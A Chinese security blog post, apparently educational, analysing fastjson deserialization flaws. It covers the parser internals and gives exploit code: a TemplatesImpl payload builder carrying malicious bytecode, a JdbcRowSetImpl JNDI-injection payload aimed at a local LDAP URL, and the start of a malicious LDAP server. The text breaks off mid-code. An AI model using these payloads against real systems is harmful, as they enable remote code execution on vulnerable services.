@@ -1,0 +1,3408 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next beep use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+  
+
+<link href="https://cdn.bootcss.com/font-awesome/4.6.2/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="java安全,fastjson," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="fastjson分析简介fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。由于其特点是快，以性能为优势快速占领了大量用户，并且其 API 十分简洁，用户量十分庞大，这也就导致了这样的组件一旦爆出漏洞，危害也将会是巨大的，因此，fastjson 从第">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson全版本漏洞分析">
+<meta property="og:url" content="http://1azy.icu/2023/05/03/fastjson/index.html">
+<meta property="og:site_name" content="1azysugar的博客">
+<meta property="og:description" content="fastjson分析简介fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。由于其特点是快，以性能为优势快速占领了大量用户，并且其 API 十分简洁，用户量十分庞大，这也就导致了这样的组件一旦爆出漏洞，危害也将会是巨大的，因此，fastjson 从第">
+<meta property="og:locale">
+<meta property="og:image" content="http://1azy.icu/images/20230505224529.png">
+<meta property="og:image" content="http://1azy.icu/images/20230505224654.png">
+<meta property="og:image" content="http://1azy.icu/images/20230505224814.png">
+<meta property="og:image" content="http://1azy.icu/images/20230505225406.png">
+<meta property="og:image" content="http://1azy.icu/images/20230505225350.png">
+<meta property="og:image" content="http://1azy.icu/images/20230505230134.png">
+<meta property="og:image" content="http://1azy.icu/images/20230505231013.png">
+<meta property="og:image" content="http://1azy.icu/images/20230505232321.png">
+<meta property="og:image" content="http://1azy.icu/images/20230505232232.png">
+<meta property="og:image" content="http://1azy.icu/images/20230505232554.png">
+<meta property="og:image" content="http://1azy.icu/images/20230505233302.png">
+<meta property="og:image" content="http://1azy.icu/images/20230505233415.png">
+<meta property="og:image" content="http://1azy.icu/images/20230506204020.png">
+<meta property="og:image" content="http://1azy.icu/images/20230506204207.png">
+<meta property="og:image" content="http://1azy.icu/images/20230506211716.png">
+<meta property="og:image" content="http://1azy.icu/images/20230506211507.png">
+<meta property="og:image" content="http://1azy.icu/images/20230505230134.png">
+<meta property="og:image" content="http://1azy.icu/images/20230506213420.png">
+<meta property="og:image" content="http://1azy.icu/images/20230506213519.png">
+<meta property="og:image" content="http://1azy.icu/images/20230506223310.png">
+<meta property="og:image" content="http://1azy.icu/images/20230506230627.png">
+<meta property="og:image" content="http://1azy.icu/images/20230506231133.png">
+<meta property="og:image" content="http://1azy.icu/images/20230506231245.png">
+<meta property="og:image" content="http://1azy.icu/images/20230507000413.png">
+<meta property="og:image" content="http://1azy.icu/images/20230507000714.png">
+<meta property="og:image" content="http://1azy.icu/images/20230507001223.png">
+<meta property="og:image" content="http://1azy.icu/images/20230507002116.png">
+<meta property="og:image" content="http://1azy.icu/images/20230507002629.png">
+<meta property="og:image" content="http://1azy.icu/images/20230507140909.png">
+<meta property="og:image" content="http://1azy.icu/images/20230507143418.png">
+<meta property="og:image" content="http://1azy.icu/images/20230507143601.png">
+<meta property="og:image" content="http://1azy.icu/images/20230507144025.png">
+<meta property="og:image" content="http://1azy.icu/images/20230507144756.png">
+<meta property="og:image" content="http://1azy.icu/images/20230507145625.png">
+<meta property="og:image" content="http://1azy.icu/images/20230507171634.png">
+<meta property="og:image" content="http://1azy.icu/images/20230522175957.png">
+<meta property="og:image" content="http://1azy.icu/images/20230522201443.png">
+<meta property="og:image" content="http://1azy.icu/images/20230523204654.png">
+<meta property="og:image" content="http://1azy.icu/images/20230523204759.png">
+<meta property="og:image" content="http://1azy.icu/images/20230524140253.png">
+<meta property="og:image" content="http://1azy.icu/images/20230524135702.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528215252.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528215840.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528220048.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528220255.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528220530.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528221107.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528221603.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528222044.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528222349.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528223122.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528223343.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528224010.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528224318.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528224525.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528225017.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528225124.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528231101.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528231235.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528231713.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528232421.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528232607.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528232640.png">
+<meta property="og:image" content="http://1azy.icu/images/20230528232721.png">
+<meta property="og:image" content="http://1azy.icu/images/20230529194517.png">
+<meta property="og:image" content="http://1azy.icu/images/20230529195111.png">
+<meta property="og:image" content="http://1azy.icu/images/20230529195300.png">
+<meta property="og:image" content="http://1azy.icu/images/20230529200158.png">
+<meta property="og:image" content="http://1azy.icu/images/20230529200512.png">
+<meta property="og:image" content="http://1azy.icu/images/20230529200653.png">
+<meta property="og:image" content="http://1azy.icu/images/20230529201006.png">
+<meta property="og:image" content="http://1azy.icu/images/20230529200948.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531174857.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531175117.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531175404.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531180757.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531182921.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531183107.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531183608.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531183634.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531184633.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531184758.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531185224.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531185832.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531190031.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531190253.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531190410.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531190907.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531192000.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531192349.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531192507.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531192656.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531192802.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531193213.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531193327.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531203048.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531203417.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531204554.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531204759.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531204954.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531210053.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531211015.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531211114.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531211348.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531211603.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531211920.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531213322.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531213659.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531214228.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531214544.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531214712.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531215003.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531215218.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531215438.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531224654.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531224749.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531225037.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531225313.png">
+<meta property="og:image" content="http://1azy.icu/images/20230531225602.png">
+<meta property="article:published_time" content="2023-05-02T19:16:12.000Z">
+<meta property="article:modified_time" content="2023-06-02T20:28:52.048Z">
+<meta property="article:author" content="1azysugar">
+<meta property="article:tag" content="java安全">
+<meta property="article:tag" content="fastjson">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://1azy.icu/images/20230505224529.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Beep',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":6,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://1azy.icu/2023/05/03/fastjson/"/>
+
+
+
+<!-- 文章加密 -->
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+		if (history.length === 1) {
+		    window.opener = null;
+		    window.open('', '_self');
+		    window.close();
+                } else {
+                    history.back();
+                }
+            }
+        }
+    })();
+</script>
+
+<!-- fontawesome5 -->
+<link href="/lib/font-awesome/css/fontawesome-all.min.css" rel="stylesheet" type="text/css" />
+
+  <title>fastjson全版本漏洞分析 | 1azysugar的博客</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband">
+	<a href="https://github.com/lazysugar" target="_blank"><img style="position: absolute; top: 0; right: 0; border: 0;" src="/images/headband/forkme_right_red.png" alt="Fork me on GitHub"></a>
+    </div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">1azysugar的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">1azysugar的博客</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa-fw fas fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa-fw fas fa-question-circle"></i> <br />
+            
+            文章
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa-fw fas fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa-fw fas fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fas fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fas fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="far fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+    
+    <a href="https://github.com/lazysugar" class="github-corner" target="_blank" title="Follow me on GitHub" aria-label="Follow me on GitHub">
+      <svg width="80" height="80" viewBox="0 0 250 250" style="fill:#222; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+	<path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path>
+      </svg>
+    </a>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://1azy.icu/2023/05/03/fastjson/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="1azysugar的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">fastjson全版本漏洞分析</h2>
+        
+
+        <div class="post-meta">
+	  
+	  
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar-plus"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-05-03T03:16:12+08:00">
+                2023-05-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">java安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <!--<i class="far fa-file-word"></i>-->
+		  <i class="fas fa-book-open"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文共计 &#58;</span>
+                
+                <span title="本文共计">
+                   字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="far fa-clock"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅文耗时 &asymp;</span>
+                
+                <span title="阅文耗时">
+                   min
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="fastjson分析"><a href="#fastjson分析" class="headerlink" title="fastjson分析"></a>fastjson分析</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。<br>由于其特点是快，以性能为优势快速占领了大量用户，并且其 API 十分简洁，用户量十分庞大，这也就导致了这样的组件一旦爆出漏洞，危害也将会是巨大的，因此，fastjson 从第一次报告安全漏洞至今，进行了若干次的安全更新，也与安全研究人员进行了来来回回多次的安全补丁-绕过的流程。本文随是一篇漏洞学习水文，但胜在记录详细，并将会持续进行更新。</p>
+<h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><pre><code>//序列化
+String text = JSON.toJSONString(obj); 
+//反序列化
+VO vo = JSON.parse(); //解析为JSONObject类型或者JSONArray类型
+VO vo = JSON.parseObject(&quot;&#123;...&#125;&quot;); //JSON文本解析成JSONObject类型
+VO vo = JSON.parseObject(&quot;&#123;...&#125;&quot;, VO.class); //JSON文本解析成VO.class类
+</code></pre>
+<p>示例：</p>
+<pre><code>public class FastjsonDemo &#123;
+
+    public static void main(String[] args) &#123;
+        User user = new User();
+        user.setAge(18);
+        user.setName(&quot;test&quot;);
+
+        String s1 = JSON.toJSONString(user);
+        System.out.println(s1);
+
+        String s2 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
+        System.out.println(s2);
+
+        Object o1 = JSON.parse(s2);
+        System.out.println(o1);
+
+        JSONObject jsonObject = JSON.parseObject(s2);
+        System.out.println(jsonObject);
+
+        User user1 = JSON.parseObject(s2, User.class);
+        System.out.println(user1);
+    &#125;
+&#125;
+</code></pre>
+<p>返回：</p>
+<pre><code>&#123;&quot;age&quot;:18,&quot;name&quot;:&quot;test&quot;&#125;
+&#123;&quot;@type&quot;:&quot;com.study.fastjson.User&quot;,&quot;age&quot;:18,&quot;name&quot;:&quot;test&quot;&#125;
+User&#123;name=&#39;test&#39;, age=18&#125;
+Disconnected from the target VM, address: &#39;127.0.0.1:5478&#39;, transport: &#39;socket&#39;
+&#123;&quot;name&quot;:&quot;test&quot;,&quot;age&quot;:18&#125;
+User&#123;name=&#39;test&#39;, age=18&#125;
+</code></pre>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>从fastjson-1.2.24的TemplatesImpl链分析：</p>
+<p>在 JSON 类的 parse 方法最后是实例化了一个 <code>DefaultJSONParser</code> 对象又调用了其 <code>parse()</code> 方法</p>
+<p><img src="/images/20230505224529.png"></p>
+<p><code>parse()</code> 方法中，会根据this.lexer.token()的值去对应的case</p>
+<p><img src="/images/20230505224654.png"></p>
+<p>这个 lexer 属性实际上是在 DefaultJSONParser 对象被实例化的时候创建的，当传入的字符串第一个字符为 <code>&#39;&#123;&#39;</code> 就为12</p>
+<p><img src="/images/20230505224814.png"></p>
+<p>进入对应的case，先new 了一个 JSONObject 对象<br>然后调用 <code>DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code> 方法去解析</p>
+<p><img src="/images/20230505225406.png"></p>
+<p>将传入的json字符串不断往后取，当<code>key == JSON.DEFAULT_TYPE_KEY</code> 去判断取出来的键是否和<code>JSON.DEFAULT_TYPE_KEY</code>相等，接着又取出了 @type 的值，交给<code>TypeUtils.loadClass</code> 方法获取Class对象</p>
+<p><img src="/images/20230505225350.png"></p>
+<p>在<code>TypeUtils#loadClass</code>方法中，会判断<code>[</code>开头或<code>L</code>开头且<code>;</code>结尾，会直接return(这是下面两个版本的绕过的原因)，并且放到mappings缓存起来</p>
+<p><img src="/images/20230505230134.png"></p>
+<p>回到<code>DefaultJSONParser#parseObject</code>，<code>config.getDeserializer(clazz);</code> 这一段最终通过 <code>createJavaBeanDeserializer</code> 方法得到 ObjectDeserializer 对象</p>
+<p><img src="/images/20230505231013.png"></p>
+<p><code>createJavaBeanDeserializer</code> 方法中，主要通过<code>JavaBeanInfo.build</code>方法获取符合条件的 getter&#x2F;setter 方法，条件如下</p>
+<ul>
+<li>其中 getter 方法需满足条件：<ul>
+<li>方法名长于 4</li>
+<li>不是静态方法</li>
+<li>以 <code>get</code> 开头且第4位是大写字母</li>
+<li>方法不能有参数传入</li>
+<li>返回值继承自 <code>Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong</code></li>
+<li>此属性没有 setter 方法</li>
+</ul>
+</li>
+<li>setter 方法需满足条件：<ul>
+<li>方法名长于 4</li>
+<li>以 <code>set</code> 开头且第4位是大写字母 </li>
+<li>非静态方法</li>
+<li>返回类型为 void 或当前类</li>
+<li>参数个数为 1 个</li>
+</ul>
+</li>
+</ul>
+<p><code>JavaBeanInfo.build</code>方法将这些满足条件的方法最后保存在<code>fieldList</code>,封装成<code>JavaBeanInfo对象</code>，<code>JavaBeanInfo对象</code>封装到<code>JavaBeanDeserializer对象</code></p>
+<p><img src="/images/20230505232321.png"><br><img src="/images/20230505232232.png"><br><img src="/images/20230505232554.png"></p>
+<p>然后调用<code>JavaBeanDeserializer.deserialze</code>去反序列化属性，具体的流程是：</p>
+<ol>
+<li>先遍历我们传入的json字符串中的key去找到对应的getter&#x2F;setter方法，没有找到的话，会new DefaultFieldDeserializer，对属性赋值<br><img src="/images/20230505233302.png"></li>
+<li>利用反射调用对应的getter&#x2F;setter方法将value赋值&#x2F;获取属性<br><img src="/images/20230505233415.png"><br>反射调用链如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:13, Test (json)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">setValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>如果是byte[]类型的属性会调用<code>JSONScanner#bytesValue</code>，其中会调用<code>IOUtils.decodeBase64</code>进行base64解码</p>
+<h1 id="fastjson-1-2-24"><a href="#fastjson-1-2-24" class="headerlink" title="fastjson-1.2.24"></a>fastjson-1.2.24</h1><h2 id="TemplatesImpl-反序列化"><a href="#TemplatesImpl-反序列化" class="headerlink" title="TemplatesImpl 反序列化"></a>TemplatesImpl 反序列化</h2><p>TemplatesImpl在CC链研究的时候分析过，这里不再追了，CC链直接用的是<code>newTransformer</code>作为入口，而这里用<code>getOutputProperties</code>作为入口，因为fastjson会调用getter&#x2F;setter方法，而 <code>getOutputProperties() </code>方法就是类成员变量 <code>_outputProperties</code> 的 <code>getter</code> 方法。同样会触发<code>newTransformer()</code></p>
+<h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><pre><code>public class FastJson &#123;
+
+    public static String readClass(String cls)&#123;
+        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+        try &#123;
+            IOUtils.copy(new FileInputStream(new File(cls)), bos);
+        &#125; catch (IOException e) &#123;
+            e.printStackTrace();
+        &#125;
+        return Base64.encodeBase64String(bos.toByteArray());
+
+    &#125;
+
+    public static void main(String[] args) throws Exception &#123;
+
+        ParserConfig config = new ParserConfig();
+        final String evilClassPath = System.getProperty(&quot;user.dir&quot;) + &quot;\\target\\classes\\json\\Test.class&quot;;
+        String evilCode = readClass(evilClassPath);
+        final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;
+        String text1 = &quot;&#123;\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +
+                &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilCode+&quot;\&quot;],&quot; +
+                &quot;&#39;_name&#39;:&#39;a.b&#39;,&quot; +
+                &quot;&#39;_tfactory&#39;:&#123; &#125;,&quot; +
+                &quot;\&quot;_outputProperties\&quot;:&#123; &#125;&#125;\n&quot;;
+        System.out.println(text1);
+        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
+
+    &#125;
+
+&#125;
+</code></pre>
+<h2 id="JdbcRowSetImpl-反序列化"><a href="#JdbcRowSetImpl-反序列化" class="headerlink" title="JdbcRowSetImpl 反序列化"></a>JdbcRowSetImpl 反序列化</h2><p>这条链本质就是<code>javax.naming.InitialContext#lookup()</code> 参数可控导致的 JNDI 注入。</p>
+<p>先看看payload：</p>
+<pre><code>&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1234/a&quot;,
+&quot;autoCommit&quot;:true&#125;
+</code></pre>
+<p>实际上：</p>
+<ol>
+<li>首先指定了该对象要反序列化的类为 com.sun.rowset.JdbcRowSetImpl</li>
+<li>设定属性 dataSourceName ldap:&#x2F;&#x2F;127.0.0.1:1234&#x2F;a ，实际上是在调用 setDataSourceName 方法</li>
+<li>设定 autoCommit 属性为 true，实际上也是在调用其 setter 方法</li>
+</ol>
+<p>调用<code>setAutoCommit</code>，当conn为空时，会调用 <code>this.connect()</code></p>
+<p><img src="/images/20230506204020.png"></p>
+<p><code>this.connect()</code>中存在JNDI连接，且<code>this.getDataSourceName()</code>可控，是<code>dataSourceName</code>属性的getter方法，导致JNDI注入</p>
+<p><img src="/images/20230506204207.png"></p>
+<h3 id="示例：-1"><a href="#示例：-1" class="headerlink" title="示例："></a>示例：</h3><p>这里我构造了一个恶意LDAP服务绑定恶意序列化数据</p>
+<pre><code>public class LDAPServerBypass &#123;
+    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;
+
+
+    public static void main (String[] args) &#123;
+
+        int port = 1234;
+
+
+        try &#123;
+            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
+            config.setListenerConfigs(new InMemoryListenerConfig(
+                    &quot;listen&quot;,
+                    InetAddress.getByName(&quot;0.0.0.0&quot;),
+                    port,
+                    ServerSocketFactory.getDefault(),
+                    SocketFactory.getDefault(),
+                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
+
+            config.addInMemoryOperationInterceptor(new OperationInterceptor());
+            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);
+            ds.startListening();
+
+        &#125;
+        catch ( Exception e ) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+
+    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;
+
+        @Override
+        public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;
+            String base = result.getRequest().getBaseDN();
+            Entry e = new Entry(base);
+            try &#123;
+                e.addAttribute(&quot;javaClassName&quot;, &quot;test&quot;);
